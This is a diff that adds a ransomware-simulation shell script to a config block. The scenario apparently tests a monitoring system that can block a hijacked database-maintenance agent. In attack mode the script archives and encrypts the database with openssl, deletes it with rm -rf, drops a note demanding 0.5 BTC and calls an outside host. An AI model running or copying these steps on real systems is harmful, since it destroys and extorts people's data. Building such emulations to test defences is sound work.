@@ -208,3 +208,48 @@ data:
       done
     fi
     echo scenario-done
+  ransom.sh: |
+    # S8 db-lock(RFC 0003):被劫持的 db-maintenance agent 沿真实勒索链行动
+    # 侦察(T1005)→ tar 归档(T1560.001)→ 加锁(T1486)→ [决策点] → 破坏(T1485)
+    # block 时破坏阶段不可达,数据完整性可验证。
+    MODE="${1:-baseline}"
+    mkdir -p /var/lib/db/data /workspace/data
+    printf 'id,balance\n1,1000\n2,2500\n' > /var/lib/db/data/users.csv
+    printf 'app data\n' > /workspace/data/app.dat
+    printf 'engine: postgres\n' > /etc/db.conf
+    N=20; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      cat /etc/db.conf > /dev/null
+      wget -q -T 2 -O /dev/null http://10.96.0.1/db-health 2>/dev/null
+      ls /workspace/data > /dev/null
+      i=$((i+1)); sleep 1
+    done
+    # 正常备份只动 workspace
+    tar czf /workspace/backup.tar.gz /workspace/data 2>/dev/null
+    if [ "$MODE" = attack ]; then
+      ls /var/lib/db
+      cat /var/lib/db/data/users.csv > /dev/null
+      tar czf /tmp/.db.tar.gz /var/lib/db 2>/dev/null
+      if command -v openssl > /dev/null; then
+        openssl enc -aes-256-cbc -in /tmp/.db.tar.gz -out /tmp/.db.tar.gz.locked -pass pass:stolen-key 2>/dev/null
+      else
+        gzip -c /tmp/.db.tar.gz > /tmp/.db.tar.gz.locked
+      fi
+    fi
+    # 决策点:破坏阶段前等待 ABIP 决策
+    i=0
+    while [ ! -f /workspace/decision.json ] && [ $i -lt 45 ]; do
+      sleep 1; i=$((i+1))
+    done
+    if [ -f /workspace/decision.json ] && grep -q '"action": "block"' /workspace/decision.json; then
+      echo "BLOCKED: $(cat /workspace/decision.json)"
+      sleep 20   # 保持存活供数据完整性验证
+      exit 1
+    fi
+    if [ "$MODE" = attack ]; then
+      rm -rf /var/lib/db/data
+      printf 'YOUR DATABASE IS LOCKED. SEND 0.5 BTC TO RECOVER.\n' > /workspace/README_RESTORE.txt
+      wget -q -T 3 -O /dev/null http://203.0.113.9/key 2>/dev/null
+    fi
+    echo MAINTAINED
